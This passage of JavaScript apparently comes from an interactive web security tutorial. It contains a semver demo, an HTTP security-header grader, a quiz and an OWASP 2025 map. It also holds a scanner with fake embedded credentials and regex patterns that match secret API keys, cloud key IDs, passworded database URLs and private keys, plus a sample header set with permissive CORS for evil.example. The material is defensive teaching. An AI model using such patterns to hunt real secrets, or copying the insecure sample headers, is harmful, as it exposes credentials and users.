      const op = m[1] || "", parts = [m[2], m[3], m[4]];
      const wild = parts.findIndex((p) => p === undefined || p === "x" || p === "*");
      const n = parts.map((p) => (p === undefined || p === "x" || p === "*" ? 0 : Number(p)));
      const lo = n.join(".");
      if (op === "^") { const hi = n[0] > 0 ? `${n[0] + 1}.0.0` : n[1] > 0 ? `0.${n[1] + 1}.0` : `0.0.${n[2] + 1}`; return (v) => cmpV(v, lo) >= 0 && cmpV(v, hi) < 0; }
      if (op === "~") { const hi = wild === 1 ? `${n[0] + 1}.0.0` : `${n[0]}.${n[1] + 1}.0`; return (v) => cmpV(v, lo) >= 0 && cmpV(v, hi) < 0; }
      if (op === "" || op === "=") {
        if (wild === 0) return () => true;
        if (wild === 1) return (v) => pv(v)[0] === n[0];
        if (wild === 2) return (v) => pv(v)[0] === n[0] && pv(v)[1] === n[1];
        return (v) => cmpV(v, lo) === 0;
      }
      return { ">=": (v) => cmpV(v, lo) >= 0, "<=": (v) => cmpV(v, lo) <= 0, ">": (v) => cmpV(v, lo) > 0, "<": (v) => cmpV(v, lo) < 0 }[op];
    });
  }
  function sv() {
    const range = $("sv-in").value;
    let fns = null; try { fns = comparators(range); } catch (e) {}
    const isTag = range.trim() === "latest";
    const sat = (v) => fns && (isTag ? v === LATEST : fns.every((f) => f(v)));
    let pick = null, note = "";
    if (!fns) { verdict("sv-verdict", "y", "Not a range this toy understands. Try ^, ~, >= or an exact version."); }
    else if (svHow === "ci") {
      if (isTag || sat(LOCKED)) { pick = LOCKED; verdict("sv-verdict", "ok", `Installs ${LOCKED}, exactly what the lock file recorded. New versions arrive only through an update you review.`); }
      else verdict("sv-verdict", "y", `Install fails: the lock file's ${LOCKED} doesn't match "${range.trim()}". (npm ci refuses when package.json and the lock file disagree.)`);
    } else {
      const ok = VERSIONS.filter((x) => sat(x.v)).map((x) => x.v).sort(cmpV);
      pick = ok[ok.length - 1] || null;
      const bad = pick && VERSIONS.find((x) => x.v === pick).bad;
      if (!pick) verdict("sv-verdict", "y", "No published version matches: install fails.");
      else verdict("sv-verdict", bad ? "bad" : "ok", `Installs ${pick}${bad ? ", published two hours ago from a stolen account." : "."}`);
    }
    if (range.trim() === "*") note = "# '*' means any version at all, including whatever is published tomorrow.";
    else if (isTag) note = "# a tag, not a range: it means whatever the maintainer (or whoever has their account) last published.";
    $("sv-note").textContent = note;
    $("sv-list").innerHTML = VERSIONS.map((x) => `<li class="${[sat(x.v) && svHow === "fresh" ? "in" : "", x.v === pick ? "pick" : "", x.bad ? "bad" : ""].join(" ").trim()}"><b>${x.v}</b><span>${esc(x.when)} · ${esc(x.note)}</span></li>`).join("");
  }

  // --------------------------------------------------------------------------- header grader
  const HD = {
    bare: "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nSet-Cookie: session=3f9a1c0e7b; Path=/\nX-Powered-By: Express",
    typical: "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8\nStrict-Transport-Security: max-age=86400\nContent-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example\nX-Frame-Options: SAMEORIGIN\nX-XSS-Protection: 1; mode=block\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true\nSet-Cookie: session=3f9a1c0e7b; Path=/; Secure\nServer: nginx/1.18.0",
    good: "HTTP/2 200\ncontent-type: text/html; charset=utf-8\nstrict-transport-security: max-age=63072000; includeSubDomains; preload\ncontent-security-policy: script-src 'nonce-R4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'; frame-ancestors 'self'\nx-content-type-options: nosniff\nreferrer-policy: strict-origin-when-cross-origin\nset-cookie: __Host-session=3f9a1c0e7b; Path=/; Secure; HttpOnly; SameSite=Lax",
  };
  function hd() {
    const lines = $("hd-in").value.split(/\r?\n/);
    const H = {}, cookies = []; let status = "";
    for (const l of lines) {
      if (/^HTTP\/\S+\s+\d{3}/i.test(l.trim())) { status = l.trim(); continue; }
      const i = l.indexOf(":"); if (i < 1) continue;
      const k = l.slice(0, i).trim().toLowerCase(), v = l.slice(i + 1).trim();
      if (k === "set-cookie") cookies.push(v); else H[k] = H[k] ? H[k] + ", " + v : v;
    }
    const out = []; let score = 0, total = 0;
    const add = (c, name, t, scored = true) => { out.push([c, name, t]); if (scored) { total++; if (c === "ok") score++; } };
    // HSTS
    const hsts = H["strict-transport-security"];
    if (!hsts) add("bad", "HSTS", "Missing: browsers may try plain HTTP first.");
    else { const ma = Number((/max-age=(\d+)/i.exec(hsts) || [])[1] || 0); add(ma >= 31536000 ? "ok" : "y", "HSTS", ma >= 31536000 ? `max-age ${ma.toLocaleString("en-US")} s${/includesubdomains/i.test(hsts) ? ", with subdomains" : ""}.` : `max-age is ${ma.toLocaleString("en-US")} s: aim for at least a year (31536000).`); }
    // CSP
    const csp = H["content-security-policy"] || "";
    if (!csp) add("bad", "CSP", H["content-security-policy-report-only"] ? "Report-only so far: a good first step. Enforce it once the reports are quiet." : "Missing: nothing limits what scripts run if an injection slips through.");
    else {
      const scr = /(?:^|;)\s*script-src([^;]*)/i.exec(csp) || /(?:^|;)\s*default-src([^;]*)/i.exec(csp);
      const s = scr ? scr[1] : "";
      if (!scr) add("y", "CSP", "No script-src or default-src, so it doesn't limit scripts.");
      else if (/'unsafe-inline'/i.test(s) && !/'nonce-|'sha(256|384|512)-/i.test(s)) add("bad", "CSP", "'unsafe-inline' lets injected inline scripts run: most of the benefit is gone.");
      else if (/'nonce-|'sha(256|384|512)-/i.test(s)) add("ok", "CSP", `Nonce or hash based${/'strict-dynamic'/i.test(s) ? " with 'strict-dynamic'" : ""}.${/object-src\s+'none'/i.test(csp) ? "" : " Add object-src 'none'."}${/base-uri/i.test(csp) ? "" : " Add base-uri 'none'."}`);
      else add("y", "CSP", "A host allow-list: better than nothing, but often bypassable. Consider nonces.");
    }
    // framing
    const xfo = (H["x-frame-options"] || "").toLowerCase();
    if (/frame-ancestors/i.test(csp) || xfo === "deny" || xfo === "sameorigin") add("ok", "Framing", /frame-ancestors/i.test(csp) ? "CSP frame-ancestors limits who can frame the page." : `X-Frame-Options ${xfo.toUpperCase()} (frame-ancestors is the modern form).`);
    else add("bad", "Framing", "Any site can put this page in a frame (clickjacking). Use frame-ancestors.");
    // nosniff
    add((H["x-content-type-options"] || "").toLowerCase() === "nosniff" ? "ok" : "bad", "nosniff", (H["x-content-type-options"] || "").toLowerCase() === "nosniff" ? "Browsers won't guess content types." : "Missing X-Content-Type-Options: nosniff.");
    // referrer
    const rp = (H["referrer-policy"] || "").toLowerCase();
    if (!rp) add("y", "Referrer", "Not set. Browsers default to strict-origin-when-cross-origin, which is decent; set it explicitly.");
    else if (/unsafe-url/.test(rp)) add("bad", "Referrer", "unsafe-url sends full URLs, query strings and all, to every site.");
    else add(/no-referrer-when-downgrade/.test(rp) ? "y" : "ok", "Referrer", rp);
    // cookies
    if (!cookies.length) add("ok", "Cookies", "No cookies set on this response.");
    else {
      const probs = cookies.map((c) => { const n = c.split("=")[0]; const miss = ["HttpOnly", "Secure", "SameSite"].filter((f) => !new RegExp(";\\s*" + f, "i").test(c)); return miss.length ? `${n} is missing ${miss.join(", ")}` : ""; }).filter(Boolean);
      add(probs.length ? "bad" : "ok", "Cookies", probs.length ? probs.join("; ") + "." : "Every cookie has HttpOnly, Secure and SameSite.");
    }
    // CORS
    const acao = H["access-control-allow-origin"], acac = /true/i.test(H["access-control-allow-credentials"] || "");
    if (!acao) add("ok", "CORS", "No CORS headers: other sites can't read responses (the safe default).");
    else if (acao === "null") add("bad", "CORS", "Allow-Origin: null can be matched by sandboxed frames and local files.");
    else if (acao === "*" && acac) add("bad", "CORS", "* with credentials: browsers refuse it. If someone 'fixed' that by echoing the Origin, any site can read signed-in responses.");
    else if (acao === "*") add("ok", "CORS", "* without credentials: fine for public data.");
    else add(acac ? "y" : "ok", "CORS", acac ? `Credentials allowed for ${acao}. Make sure that comes from an allow-list, never copied from the request's Origin.` : `Allows ${acao} to read responses, without credentials.`);
    // unscored notes
    const xxp = H["x-xss-protection"];
    if (xxp && xxp.trim() !== "0") add("y", "X-XSS-Protection", "Deprecated, and can create XSS holes: remove it or set it to 0, and rely on CSP.", false);
    for (const k of ["server", "x-powered-by"]) if (H[k] && /\d/.test(H[k])) add("y", k === "server" ? "Server" : "X-Powered-By", `"${H[k]}" reveals a version: a small information leak, worth removing.`, false);
    $("hd-score").innerHTML = `<b>${score}</b> / ${total}`;
    $("hd-list").innerHTML = out.map(([c, n, t]) => `<li class="${c}"><b>${c === "ok" ? "✓" : c === "bad" ? "✗" : "!"}</b><span><i>${esc(n)}</i> ${esc(t)}</span></li>`).join("");
    let note = "";
    if (/^HTTP\/\S+\s+418\b/i.test(status)) note = "# 418 I'm a teapot: RFC 2324, an April Fools' RFC from 1998. Short and stout, and still needs headers.";
    else if (/gnu terry pratchett/i.test(H["x-clacks-overhead"] || "")) note = "# GNU Terry Pratchett. Not a security header: a tribute that keeps a name moving through the clacks.";
    else if (/php\/5\./i.test(H["x-powered-by"] || "")) note = "# PHP 5 has been out of support since the end of 2018. That one's worth more than hiding the header.";
    else if (score === total && total) note = "# full marks. Now make it the default for every response, not just this one.";
    $("hd-note").textContent = note;
  }

  // --------------------------------------------------------------------------- secrets in the bundle (all fake)
  const PK = "-----BEGIN " + "PRIVATE KEY-----";
  const BUNDLE = '!function(){"use strict";var e={apiBase:"https://api.example.com",\n' +
    'stripeKey:"pk_live_EXAMPLE0publishable0key",\nmapsKey:"AIzaEXAMPLE-browser-key-restricted",\n' +
    'adminToken:"sk_live_EXAMPLE_not_a_real_key",\ndbUrl:"postgres://app:hunter2@db.internal:5432/prod",\n' +
    'awsKeyId:"AKIAIOSFODNN7EXAMPLE",\nsigningKey:"' + PK + '\\nMIIEvQ…EXAMPLE…"};\nwindow.__CONFIG__=e}();';
  const SC_PATS = [
    [/pk_live_[A-Za-z0-9_]+/g, "y", "Publishable payment key: public by design. Fine."],
    [/AIza[A-Za-z0-9_\-]+/g, "y", "Browser maps key: meant for browsers, but restrict it to your site in the provider's console."],
    [/sk_live_[A-Za-z0-9_]+/g, "bad", "Secret API key: anyone can now act as your account. Revoke and replace it."],
    [/[a-z]+:\/\/[^:\s"&]+:[^@\s"&]+@[^\s"&]+/g, "bad", "Database URL with a password in it."],
    [/AKIA[0-9A-Z]{16}/g, "bad", "Cloud access key ID: the secret half is usually nearby."],
    [new RegExp(PK.replace(/-/g, "\\-"), "g"), "bad", "A private key."],
  ];
  function scShow(scanned) {
    let html = esc(BUNDLE);
    if (scanned) {                                    // find matches in the raw text, then escape each piece
      const hits = [];
      for (const [re, c] of SC_PATS) for (const m of BUNDLE.matchAll(new RegExp(re.source, "g"))) hits.push([m.index, m.index + m[0].length, c]);
      hits.sort((a, b) => a[0] - b[0]);
      let at = 0; html = "";
      for (const [a, b, c] of hits) { if (a < at) continue; html += esc(BUNDLE.slice(at, a)) + `<mark class="${c}">${esc(BUNDLE.slice(a, b))}</mark>`; at = b; }
      html += esc(BUNDLE.slice(at));
    }
    $("sc-bundle").innerHTML = html;
    if (!scanned) { $("sc-list").innerHTML = '<li class="m">Press "Search the bundle", like anyone with dev tools can.</li>'; $("sc-note").textContent = ""; return; }
    $("sc-list").innerHTML = SC_PATS.map(([re, c, t]) => { const m = BUNDLE.match(re); return m ? `<li class="${c}"><b>${c === "bad" ? "✗" : "!"}</b><span><code>${esc(m[0].length > 30 ? m[0].slice(0, 28) + "…" : m[0])}</code> ${esc(t)}</span></li>` : ""; }).join("");
    $("sc-note").textContent = "# AKIAIOSFODNN7EXAMPLE is the example key from AWS's own documentation. It has never opened anything, which is the best thing a key in a bundle can do.";
  }

  // --------------------------------------------------------------------------- which tool catches it?
  const TOOLS = { secret: "Secret scanning", sca: "Dependency scanning", sast: "SAST", dast: "DAST", review: "Review and tests" };
  const PL = [
    ["An AWS key committed in config.py", ["secret"], "A known key format: secret scanning blocks it at push."],
    ["A dependency with a published CVE", ["sca"], "Your lock file against advisory databases."],
    ["SQL built by string concatenation", ["sast"], "A classic code pattern that SAST rules look for."],
    ["Staging is missing HSTS and CSP headers", ["dast"], "Only visible in the running app's responses."],
    ["GET /invoices/:id doesn't check the owner", ["review"], "Tools can't know who should own what. Tests and review can."],
    ["A search page reflects input without escaping", ["sast", "dast"], "Both can find it: SAST from the code, DAST by trying it."],
  ];
  function plRender() {
    $("pl-rows").innerHTML = PL.map(([bug], i) => `<tr><th scope="row">${esc(bug)}</th><td><select data-i="${i}" aria-label="Tool for: ${esc(bug)}"><option value="">Choose…</option>${Object.entries(TOOLS).map(([k, n]) => `<option value="${k}">${esc(n)}</option>`).join("")}</select><span class="pl-why" id="pl-why-${i}"></span></td></tr>`).join("");
    $("pl-score").textContent = ""; $("pl-note").textContent = "";
  }
  function plCheck() {
    let right = 0;
    document.querySelectorAll("#pl-rows select").forEach((s) => {
      const i = +s.dataset.i, [, ok, why] = PL[i], good = ok.includes(s.value);
      if (good) right++;
      const w = $("pl-why-" + i); w.className = "pl-why " + (good ? "ok" : "bad");
      w.textContent = (good ? "✓ " : `✗ ${ok.map((k) => TOOLS[k]).join(" or ")}. `) + why;
    });
    $("pl-score").textContent = `${right} of ${PL.length}`;
    $("pl-note").textContent = right === PL.length ? "# six for six. You'd make a fine pipeline yourself; let the tools do the boring parts." : "";
  }

  // --------------------------------------------------------------------------- OWASP map
  const OW = [
    ["A01", "Broken Access Control", "Missing or wrong checks on who may do what, to which object. Now includes SSRF.", [["#access", "Access control"], ["#ssrf", "SSRF"]]],
    ["A02", "Security Misconfiguration", "Missing headers, permissive CORS, default settings, verbose errors.", [["#headers", "Headers"]]],
    ["A03", "Software Supply Chain Failures", "Vulnerable, outdated or malicious dependencies, and the build pipeline itself. New in 2025.", [["#deps", "Dependencies"]]],
    ["A04", "Cryptographic Failures", "Weak, misused or missing cryptography.", [["../crypto-in-code/", "Using Crypto Correctly in Code"]]],
    ["A05", "Injection", "Data treated as code: SQL, HTML (cross-site scripting), shell and more.", [["#sqli", "SQL"], ["#xss", "XSS"]]],
    ["A06", "Insecure Design", "Controls that were never designed in. Decide who may do what before you build it.", [["#authz", "Deny by default"]]],
    ["A07", "Authentication Failures", "Weak sign-in, session handling and credential storage.", [["#sessions", "Sessions"]]],
    ["A08", "Software or Data Integrity Failures", "Trusting code or data you haven't checked: unverified updates, scripts and serialised objects.", [["#deps", "Dependencies"], ["#csp", "CSP"]]],
    ["A09", "Security Logging and Alerting Failures", "Not covered today: if nobody is alerted, every other failure lasts longer.", []],
    ["A10", "Mishandling of Exceptional Conditions", "Failing open, leaking error details, or leaving work half-done when something goes wrong. New in 2025.", [["#sqli", "The SQL error message"]]],
  ];
  const owSeen = new Set();
  function owRender() {
    $("ow-grid").innerHTML = OW.map(([k, n], i) => `<li><button type="button" data-i="${i}" aria-pressed="false"><small>${k}:2025</small><b>${esc(n)}</b></button></li>`).join("");
  }
  function owPick(i) {
    const [k, n, d, links] = OW[i]; owSeen.add(i);
    document.querySelectorAll("#ow-grid button").forEach((b) => { b.setAttribute("aria-pressed", String(+b.dataset.i === i)); if (owSeen.has(+b.dataset.i)) b.classList.add("seen"); });
    $("ow-detail").innerHTML = `<b>${k} ${esc(n)}</b> ${esc(d)}${links.length ? " Today: " + links.map(([h, t]) => `<a href="${h}">${esc(t)}</a>`).join(" · ") : ""}` +
      (owSeen.size === OW.length ? '<span class="comment"># all ten opened. That\'s the whole map; the rest of the territory is your own code.</span>' : "");
  }

  // --------------------------------------------------------------------------- review checklist
  const RV_KEY = "websec-review";
  function review() {
    const boxes = Array.from(document.querySelectorAll("#rv-list input[type=checkbox]"));
    let saved = {};
    try { saved = JSON.parse(store(RV_KEY) || "{}"); } catch (e) {}
    boxes.forEach((b) => { b.checked = !!saved[b.dataset.k]; });
    const update = () => {
      const done = boxes.filter((b) => b.checked).length;
      store(RV_KEY, JSON.stringify(Object.fromEntries(boxes.map((b) => [b.dataset.k, b.checked]))));
      const n = $("rv-note"); n.className = "comment";
      if (done === boxes.length) { n.textContent = "# 12 of 12. Ship it, then run the list again next quarter: apps change, and so do the bugs."; n.classList.add("ok"); }
      else if (!done) n.textContent = "# tick what your project does today. Each gap is a ticket, not a failure. Saved in this browser only.";
      else n.textContent = `# ${done} of ${boxes.length}. Pick the unticked box most likely to bite and fix that first.`;
    };
    boxes.forEach((b) => b.addEventListener("change", update));
    update();
  }

  // --------------------------------------------------------------------------- easter egg: console
  function consoleHint() {
    console.log("%cWeb Application Security Essentials", "font: 700 24px monospace; color: #ff2e88; text-shadow: 0 0 8px #ff2e88");
    console.log("%cYou opened the console: the first tool of every web security tester. Everything here is a simulation; try the SQL demo's O'Brien, then switch to parameters.", "font: 14px monospace; color: #00f0ff");
  }

  function start() {
    consoleHint();
    $("hero-in").addEventListener("input", hero); hero();
    $("sq-in").addEventListener("input", sq);
    presets("sq-presets", "data-v", (v) => { $("sq-in").value = v; sq(); });
    segPick("sq-mode", "data-m", (m) => { sqMode = m; sq(); }); sq();
    const xsSet = (p) => { $("xs-in").value = XS[p][0]; $("xs-url").value = XS[p][1]; xs(); };
    presets("xs-presets", "data-p", xsSet);
    $("xs-in").addEventListener("input", xs); $("xs-url").addEventListener("input", xs); xsSet("img");
    segPick("cs-pick", "data-c", cs); cs("none");
    segPick("ac-route", "data-r", acSet);
    click("ac-send", acSend); click("ac-prev", () => acStep(-1)); click("ac-next", () => acStep(1));
    $("ac-url").addEventListener("keydown", (e) => { if (e.key === "Enter") acSend(); });
    $("ac-check").addEventListener("change", acSend); $("ac-hide").addEventListener("change", acSend); acSet("invoice");
    for (const id of ["ck-name", "ck-ss", "ck-dom", "ck-http", "ck-sec", "ck-path"]) $(id).addEventListener(id === "ck-name" ? "input" : "change", ck); ck();
    for (const id of ["cf-from", "cf-ss", "cf-token", "cf-origin", "cf-postonly"]) $(id).addEventListener("change", cf); cf();
    $("sf-in").addEventListener("input", sf);
    presets("sf-presets", "data-v", (v) => { $("sf-in").value = v; sf(); }); sf();
    $("sv-in").addEventListener("input", sv);
    presets("sv-presets", "data-v", (v) => { $("sv-in").value = v; sv(); });
    segPick("sv-how", "data-h", (h) => { svHow = h; sv(); }); sv();
    segPick("hd-pick", "data-s", (s) => { $("hd-in").value = HD[s]; hd(); }); $("hd-in").addEventListener("input", hd); $("hd-in").value = HD.bare; hd();
    click("sc-scan", () => scShow(true)); click("sc-reset", () => scShow(false)); scShow(false);
    plRender(); click("pl-check", plCheck); click("pl-reset", plRender);
    owRender(); $("ow-grid").addEventListener("click", (e) => { const b = e.target.closest("button[data-i]"); if (b) owPick(+b.dataset.i); });
    review();
  }
  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", start); else start();
})();
